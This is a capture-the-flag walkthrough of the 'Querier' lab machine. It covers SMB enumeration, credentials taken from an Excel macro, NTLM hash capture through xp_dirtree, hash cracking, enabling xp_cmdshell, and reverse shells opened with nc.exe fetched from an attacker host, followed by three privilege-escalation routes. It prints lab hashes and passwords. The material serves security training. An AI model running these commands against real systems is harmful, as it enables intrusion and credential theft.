# Querier

### Full Port Scan

<figure><img src="../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

### Nmap Aggressive scan

<figure><img src="../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

### Enumerating SMB

* `smbclient -L //10.10.10.125 -N`

<figure><img src="../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

* Found `Currency Volume Report.xlsm`

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

* Opening the file, I saw that there’s macros inside
* Opening up `Currency Volume Report.xlsm` —> `view code`

<figure><img src="../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

* Found password `PcwTWTHRwryjc$c6` and username: `reporting`, Database: `volume`
* Using the creds, managed to login to the MSSQL server

```bash
/usr/share/doc/python3-impacket/examples/mssqlclient.py reporting@10.10.10.125 -windows-auth
```

### Capture mssql credentials-with xp-dirtree and smbserver-py

* Setup the smbserver

```bash
python3 /usr/local/bin/smbserver.py share . -smb2support
```

* Login to MSSQL server

```bash
/usr/share/doc/python3-impacket/examples/mssqlclient.py reporting@10.10.10.125 -windows-auth
```

* Run the `xp_dirtree` command to connect to our smbserver

```bash
EXEC master.sys.xp_dirtree '\\\\10.10.14.6\\share',1, 1
```

* Obtained the hash for `mssql-svc` account

<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

```bash
mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:533f791f193e74c54f52806542c622ee:010100000000000000aa4a71c657d90177d39b57c2e762eb0000000001001000500075004b0071004900470061006f0003001000500075004b0071004900470061006f000200100056004d004a00510070006900760073000400100056004d004a00510070006900760073000700080000aa4a71c657d901060004000200000008003000300000000000000000000000003000007f0fd403abd9b83ec1da57b18ed542302ab365d2b86e14497a32441ca7a2abe60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003600000000000000000000000000
```

### Cracking Hash

* Identify hash type

```bash
hashcat --identify mssql_svc.hash
```

<figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

* Use hashcat to crack the hash

```bash
hashcat -m 5600 -a 0 mssql_svc.hash /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

* Got the credentials

```bash
MSSQL-SVC:corporate568
```

### Login as `mssql-svc` on MSSQL server

```bash
/usr/share/doc/python3-impacket/examples/mssqlclient.py mssql-svc@10.10.10.125 -windows-auth
```

* Configure `xp_cmdshell`

```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

* make `c:\\temp` directory and download `nc.exe` from attacker and execute a reverse shell back to attacker

```bash
xp_cmdshell "mkdir c:\\temp"
```

```bash
xp_cmdshell "powershell -c cd C:\\Users\\mssql-svc\\Downloads; wget <http://10.10.14.6/nc.exe> -outfile nc.exe"
xp_cmdshell "powershell -c cd C:\\Users\\mssql-svc\\Downloads; .\\nc.exe -e cmd.exe 10.10.14.6 443"
```

* Got user shell!

<figure><img src="../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

### Running `powerup.ps1`

```bash
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.6/powerup.ps1' -OutFile 'C:\\Users\\mssql-svc\\Downloads\\powerup.ps1'"
```

```bash
powershell -ep bypass .\powerup.ps1
```

<figure><img src="../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

3 Methods are present:

1. `SeImpersonatePrivilege` is enabled —> printspoofer
2. Insecure Service Permissions for `UsoSvc` service —> change the `binpath` to reverse shell
3. Cached GPP Files password —> `Administrator:MyUnclesAreMarioAndLuigi!!1!`

### Method 1 (PrintSpoofer):

* Download PrintSpoofer from attacker

```bash
powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.6/printspoofer64.exe' -OutFile 'C:\\Users\\mssql-svc\\Downloads\\printspoofer64.exe'"
```

```bash
printspoofer64.exe -c "nc.exe -e cmd.exe 10.10.14.6 4444"
```

<figure><img src="../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

### Method 2 (Insecure Service Permissions):

* Displays more information about a service

```bash
sc qc UsoSvc
```

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

```bash
sc config usosvc binpath="c:\\Users\\mssql-svc\\Downloads\\nc.exe -e cmd.exe 10.10.14.6 4444"
```

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

### Method 3:

* Using the creds: `Administrator:MyUnclesAreMarioAndLuigi!!1!` to login

```bash
impacket-psexec administrator@10.10.10.125
```

<figure><img src="../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>
